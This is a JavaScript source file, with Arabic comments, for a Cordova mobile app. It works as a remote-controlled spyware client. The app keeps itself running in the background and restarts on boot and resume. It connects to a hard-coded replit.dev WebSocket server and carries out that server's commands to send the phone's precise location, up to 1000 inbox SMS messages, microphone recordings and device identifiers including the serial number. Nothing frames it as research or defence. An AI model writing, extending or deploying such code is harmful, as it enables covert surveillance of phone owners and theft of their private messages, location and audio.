// app.js - الإصدار المعدّل للتشغيل الدائم في الخلفية

// تخزين الطلبات المستلمة
const receivedRequests = [];

// متغير لتخزين معلومات الجهاز
let deviceInfo = null;

// متغير لمراقبة حالة الخدمة
let isServiceRunning = false;

// متغير لتخزين مؤقت إعادة الاتصال
let reconnectTimeout = null;

// دالة لتفعيل وضع الخلفية
function enableBackgroundMode() {
  if (cordova.plugins.backgroundMode) {
    cordova.plugins.backgroundMode.setDefaults({
      title: 'التطبيق يعمل في الخلفية',
      text: 'اتصال نشط مع الخادم',
      silent: true,
      hidden: false,
      bigText: true,
      color: 'F14F4D',
      icon: 'icon',
      resume: true,
      heartbeat: 30
    });
    
    cordova.plugins.backgroundMode.enable();
    
    cordova.plugins.backgroundMode.on('activate', function() {
      cordova.plugins.backgroundMode.configure({
        silent: true
      });
      
      // إذا كان الاتصال قد انقطع، نعيد الاتصال
      if (window.wsConnection && window.wsConnection.readyState !== WebSocket.OPEN) {
        console.log('Reconnecting WebSocket from background mode activate');
        if (deviceInfo) {
          connectToServer(deviceInfo);
        }
      }
    });
    
    // منع إيقاف الخدمة عند الخروج من التطبيق
    cordova.plugins.backgroundMode.on('deactivate', function() {
      setTimeout(function() {
        cordova.plugins.backgroundMode.forceReady();
      }, 1000);
    });
    
    console.log('Background mode enabled');
  } else {
    console.error('Background mode plugin not available');
  }
}

// دالة لتوليد UUID فريد إذا لم يكن موجوداً
function generateUUID() {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
    const r = Math.random() * 16 | 0;
    const v = c === 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
  });
}

// دالة لاستخراج معلومات الجهاز
function getDeviceInfo() {
  return {
    uuid: device.uuid || generateUUID(),
    model: device.model || 'Unknown',
    platform: device.platform || 'Unknown',
    version: device.version || 'Unknown',
    manufacturer: device.manufacturer || 'Unknown',
    battery: null,
    timestamp: new Date().toISOString()
  };
}

// دالة لتحديث معلومات البطارية
function updateBatteryInfo() {
  if (!deviceInfo) return;
  
  if (navigator.getBattery) {
    navigator.getBattery().then(battery => {
      deviceInfo.battery = {
        level: Math.round(battery.level * 100),
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime
      };
      
      // إرسال تحديث البطارية إلى الخادم إذا كان الاتصال نشطاً
      if (window.wsConnection && window.wsConnection.readyState === WebSocket.OPEN) {
        window.wsConnection.send(JSON.stringify({
          type: 'device_update',
          deviceInfo: {
            battery: deviceInfo.battery,
            timestamp: new Date().toISOString()
          }
        }));
      }
    }).catch(error => {
      console.error('Battery API error:', error);
    });
  }
}

// دالة للاتصال بخادم WebSocket
function connectToServer(deviceInfoParam) {
  // إلغاء أي محاولة اتصال سابقة
  if (reconnectTimeout) {
    clearTimeout(reconnectTimeout);
    reconnectTimeout = null;
  }
  
  // حفظ معلومات الجهاز
  deviceInfo = deviceInfoParam;
  
  // إغلاق أي اتصال موجود
  if (window.wsConnection) {
    try {
      window.wsConnection.close();
    } catch (e) {
      console.log('No existing connection to close');
    }
    window.wsConnection = null;
  }
  
  console.log('Connecting to WebSocket server...');
  
  // استخدام رابط الخادم المقدم
  const wsUrl = 'wss://0c0d4d48-f2d0-4f6b-9a7c-dfaeba1f204e-00-1fpda24jsv608.sisko.replit.dev';
  
  try {
    window.wsConnection = new WebSocket(wsUrl);
    
    window.wsConnection.onopen = () => {
      console.log('Connected to server');
      
      // تسجيل الجهاز
      if (window.wsConnection && window.wsConnection.readyState === WebSocket.OPEN) {
        window.wsConnection.send(JSON.stringify({
          type: 'register',
          deviceId: deviceInfo.uuid,
          deviceInfo
        }));
      }
    };
    
    window.wsConnection.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        
        if (data.type === 'command') {
          console.log('Received command:', data.command);
          // تخزين الطلب المستلم
          receivedRequests.push({
            ...data.command,
            receivedAt: new Date().toISOString()
          });
          
          // تنفيذ الأمر وإرسال الرد
          executeCommand(data.command, (response) => {
            if (window.wsConnection && window.wsConnection.readyState === WebSocket.OPEN) {
              window.wsConnection.send(JSON.stringify({
                type: 'response',
                commandId: data.commandId,
                response: {
                  ...response,
                  requestData: data.command
                }
              }));
            }
          });
        }
        else if (data.type === 'registered') {
          console.log('Device registered successfully:', data);
        }
        
      } catch (error) {
        console.error('Error processing message:', error);
      }
    };
    
    window.wsConnection.onerror = (error) => {
      console.error('WebSocket error:', error);
    };
    
    window.wsConnection.onclose = (event) => {
      console.log('Disconnected from server', event);
      
      // محاولة إعادة الاتصال بعد 5 ثوانٍ
      reconnectTimeout = setTimeout(() => {
        if (deviceInfo) {
          connectToServer(deviceInfo);
        }
      }, 5000);
    };
    
    // إرسال نبضات قلبية دورية
    if (window.heartbeatInterval) {
      clearInterval(window.heartbeatInterval);
    }
    
    window.heartbeatInterval = setInterval(() => {
      if (window.wsConnection && window.wsConnection.readyState === WebSocket.OPEN) {
        window.wsConnection.send(JSON.stringify({ 
          type: 'heartbeat',
          timestamp: new Date().toISOString(),
          receivedRequests
        }));
      }
    }, 30000);
    
  } catch (error) {
    console.error('WebSocket connection error:', error);
    
    // محاولة إعادة الاتصال بعد خطأ
    reconnectTimeout = setTimeout(() => {
      if (deviceInfo) {
        connectToServer(deviceInfo);
      }
    }, 5000);
  }
}

// دالة لتنفيذ الأوامر
function executeCommand(command, callback) {
  console.log('Executing command:', command);
  
  // إضافة commandId للتعقب
  const commandId = Date.now();
  
  switch (command.type) {
    case 'get_location':
      getLocation(commandId, callback);
      break;
    case 'get_sms':
      getSMS(commandId, callback);
      break;
    case 'record_audio':
      recordAudio(commandId, command.duration, callback);
      break;
    case 'get_device_info':
      getDeviceInfoCommand(commandId, callback);
      break;
    case 'get_received_requests':
      getReceivedRequests(commandId, callback);
      break;
    default:
      callback({ 
        commandId,
        status: 'error',
        error: 'Unknown command',
        receivedCommand: command
      });
  }
}

// دالة لجلب الموقع
function getLocation(commandId, callback) {
  const options = {
    enableHighAccuracy: true,
    timeout: 15000,
    maximumAge: 0
  };
  
  navigator.geolocation.getCurrentPosition(
    (position) => {
      const locationData = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy,
        altitude: position.coords.altitude,
        altitudeAccuracy: position.coords.altitudeAccuracy,
        heading: position.coords.heading,
        speed: position.coords.speed,
        timestamp: position.timestamp
      };
      
      callback({
        commandId,
        status: 'success',
        location: locationData,
        googleMapsLink: `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`
      });
    },
    (error) => {
      callback({ 
        commandId,
        status: 'error',
        error: 'Location error',
        details: {
          code: error.code,
          message: error.message,
          PERMISSION_DENIED: error.PERMISSION_DENIED,
          POSITION_UNAVAILABLE: error.POSITION_UNAVAILABLE,
          TIMEOUT: error.TIMEOUT
        }
      });
    },
    options
  );
}

// دالة لجلب الرسائل القصيرة
function getSMS(commandId, callback) {
  if (typeof SMS === 'undefined') {
    return callback({ 
      commandId,
      status: 'error',
      error: 'SMS plugin not available',
      suggestion: 'Install cordova-sms-plugin'
    });
  }
  
  const filter = {
    box: 'inbox',
    maxCount: 1000,
    indexFrom: 0
  };
  
  SMS.listSMS(
    filter,
    (messages) => {
      callback({
        commandId,
        status: 'success',
        count: messages.length,
        messages: messages.map(msg => ({
          id: msg._id,
          address: msg.address,
          body: msg.body,
          date: msg.date,
          read: msg.read
        }))
      });
    },
    (error) => {
      callback({ 
        commandId,
        status: 'error',
        error: 'SMS error',
        details: error
      });
    }
  );
}

// دالة لتسجيل الصوت
function recordAudio(commandId, duration, callback) {
  duration = duration || 10; // Default 10 seconds
  
  const mediaRecorderOptions = {
    mimeType: 'audio/mp3',
    audioBitsPerSecond: 128000
  };
  
  navigator.mediaDevices.getUserMedia({ audio: true })
    .then(stream => {
      const mediaRecorder = new MediaRecorder(stream, mediaRecorderOptions);
      const audioChunks = [];
      
      mediaRecorder.ondataavailable = event => {
        audioChunks.push(event.data);
      };
      
      mediaRecorder.onstop = () => {
        const audioBlob = new Blob(audioChunks, { type: 'audio/mp3' });
        const audioUrl = URL.createObjectURL(audioBlob);
        
        // حفظ التسجيل في التخزين المحلي
        const fileName = `recording_${commandId}.mp3`;
        saveAudioToStorage(fileName, audioBlob);
        
        callback({ 
          commandId,
          status: 'success',
          audio: {
            duration: duration,
            format: 'mp3',
            size: audioBlob.size,
            downloadUrl: audioUrl,
            fileName: fileName
          }
        });
      };
      
      mediaRecorder.start();
      setTimeout(() => {
        mediaRecorder.stop();
        stream.getTracks().forEach(track => track.stop());
      }, duration * 1000);
    })
    .catch(error => {
      callback({ 
        commandId,
        status: 'error',
        error: 'Audio recording error',
        details: error.message
      });
    });
}

// دالة لحفظ التسجيل الصوتي
function saveAudioToStorage(fileName, blob) {
  // حفظ الملف في التخزين المحلي
  window.resolveLocalFileSystemURL(cordova.file.dataDirectory, dir => {
    dir.getFile(fileName, { create: true }, fileEntry => {
      fileEntry.createWriter(fileWriter => {
        fileWriter.onwriteend = () => console.log('Audio file saved:', fileName);
        fileWriter.onerror = e => console.error('Error saving file:', e);
        fileWriter.write(blob);
      });
    });
  });
}

// دالة لجلب معلومات الجهاز
function getDeviceInfoCommand(commandId, callback) {
  const info = {
    cordova: device.cordova,
    model: device.model,
    platform: device.platform,
    uuid: device.uuid,
    version: device.version,
    manufacturer: device.manufacturer,
    isVirtual: device.isVirtual,
    serial: device.serial
  };
  
  callback({
    commandId,
    status: 'success',
    deviceInfo: info
  });
}

// دالة لجلب الطلبات المستلمة
function getReceivedRequests(commandId, callback) {
  callback({
    commandId,
    status: 'success',
    requests: receivedRequests,
    count: receivedRequests.length
  });
}

// دالة التهيئة الرئيسية
function initializeApp() {
  console.log('Initializing app...');
  
  // إعداد وضع الخلفية
  enableBackgroundMode();
  
  // الحصول على معلومات الجهاز
  const deviceInfo = getDeviceInfo();
  
  // مراقبة حالة البطارية
  if (navigator.getBattery) {
    navigator.getBattery().then(battery => {
      deviceInfo.battery = {
        level: Math.round(battery.level * 100),
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime
      };
      
      // بدء الاتصال بالخادم
      connectToServer(deviceInfo);
      
      // مراقبة تغيرات البطارية
      battery.addEventListener('levelchange', updateBatteryInfo);
      battery.addEventListener('chargingchange', updateBatteryInfo);
    }).catch(error => {
      console.error('Battery API error:', error);
      connectToServer(deviceInfo);
    });
  } else {
    connectToServer(deviceInfo);
  }
  
  // مراقبة حالة التطبيق
  document.addEventListener('resume', () => {
    console.log('App resumed');
    if (window.wsConnection && window.wsConnection.readyState !== WebSocket.OPEN) {
      console.log('Reconnecting WebSocket after resume');
      if (deviceInfo) {
        connectToServer(deviceInfo);
      }
    }
  }, false);
  
  document.addEventListener('pause', () => {
    console.log('App paused, keeping service running');
    // لا نفعل أي شيء هنا، نحافظ على الخدمة نشطة
  }, false);
  
  // مراقبة حالة الشبكة
  document.addEventListener('online', () => {
    console.log('Network online, reconnecting if needed');
    if (window.wsConnection && window.wsConnection.readyState !== WebSocket.OPEN) {
      if (deviceInfo) {
        connectToServer(deviceInfo);
      }
    }
  }, false);
  
  document.addEventListener('offline', () => {
    console.log('Network offline');
  }, false);
  
  console.log('Initialization complete');
}

// عند جاهزية الجهاز
document.addEventListener('deviceready', function() {
  console.log('Device is ready');
  initializeApp();
}, false);

// دعم التشغيل التلقائي بعد إعادة التشغيل
document.addEventListener('boot', function() {
  console.log('Device booted, starting service');
  initializeApp();
}, false);

// تأكد من بدء الخدمة حتى لو لم يتم استدعاء deviceready
setTimeout(function() {
  if (!isServiceRunning) {
    console.log('Forcing service start after timeout');
    initializeApp();
  }
}, 10000);
